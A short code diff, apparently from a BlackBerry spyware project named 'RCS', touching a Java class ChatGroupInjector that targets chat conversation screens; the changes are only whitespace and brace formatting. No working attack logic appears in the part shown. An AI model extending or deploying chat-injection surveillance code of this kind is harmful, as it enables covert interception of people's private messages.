@@ -6,7 +6,7 @@
  * 
  * Project      : RCS, RCSBlackBerry
  * *************************************************/
-	
+
 package blackberry.injection.injectors.group;
 
 import java.util.Vector;
@@ -31,11 +31,11 @@ public abstract class ChatGroupInjector extends AInjector {
 
     public abstract String getCodName();
 
-    public String getPreferredMenuName(){
+    public String getPreferredMenuName() {
         //TODO: messages
         return "Abort";
     }
-    
+
     public String[] getWantedScreen() {
         return new String[] { "ConversationScreen" };
     }
